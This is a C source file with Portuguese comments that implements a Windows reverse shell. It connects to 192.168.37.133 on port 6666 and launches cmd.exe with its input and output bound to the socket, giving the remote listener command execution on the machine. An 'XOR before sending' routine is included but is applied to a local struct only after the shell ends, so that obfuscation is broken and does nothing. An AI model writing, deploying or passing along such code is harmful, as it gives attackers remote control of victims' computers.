#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <WS2tcpip.h> 

#pragma comment(lib, "ws2_32.lib")

// Função XOR nos Dados
void applyXOR(char* data, int dataSize, const char* key, int keySize)
{
    for (int i = 0; i < dataSize; i++)
    {
        data[i] ^= key[i % keySize];
    }
}

int main()
{
    WSADATA wsaData;
    SOCKET clientSocket;
    struct sockaddr_in serverAddress;
    char ip_addr[16];
    STARTUPINFOA startupInfo;
    PROCESS_INFORMATION processInfo;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    clientSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    //Função de Conexão
    serverAddress.sin_family = AF_INET;
    //Definição a Porta
    serverAddress.sin_port = htons(6666);
    //Definição de Endereço IP
    inet_pton(AF_INET, "192.168.37.133", &(serverAddress.sin_addr.s_addr));

    if (WSAConnect(clientSocket, (SOCKADDR*)&serverAddress, sizeof(serverAddress), NULL, NULL, NULL, NULL) != 0)
    {
        printf("%d\n", WSAGetLastError());
        getchar();
        exit(-1);
    }

    memset(&startupInfo, 0, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE)clientSocket;
    //Definição de execução de Comandos Remotos 
    char cmdline[MAX_PATH] = "cmd.exe";
    CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo);

    WaitForSingleObject(processInfo.hProcess, INFINITE);
    CloseHandle(processInfo.hProcess);

    // XOR nos dados antes de enviá-los
    char xorKey[] = "mysecretkey";
    applyXOR((char*)&startupInfo, sizeof(startupInfo), xorKey, sizeof(xorKey));

    getchar();
    return 0;
}